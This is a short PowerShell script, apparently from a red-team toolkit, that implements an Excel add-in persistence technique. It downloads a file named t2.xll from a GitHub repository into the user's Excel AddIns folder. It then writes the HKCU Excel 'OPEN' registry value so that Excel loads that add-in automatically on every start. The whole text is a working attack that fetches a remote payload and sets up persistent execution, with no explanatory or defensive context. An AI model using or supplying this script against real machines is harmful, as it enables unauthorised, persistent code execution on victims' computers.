$url = "https://raw.githubusercontent.com/ferreirasc/redteam-arsenal/master/arsenal/t2.xll"
$destination = "$env:LOCALAPPDATA\..\Roaming\Microsoft\AddIns\t2.xll"

Invoke-WebRequest -Uri $url -OutFile $destination

$registryPath = "HKCU:\SOFTWARE\Microsoft\Office\16.0\Excel\Options"
Set-ItemProperty -Path $registryPath -Name "OPEN" -Value "/R t2.xll" | Out-Null
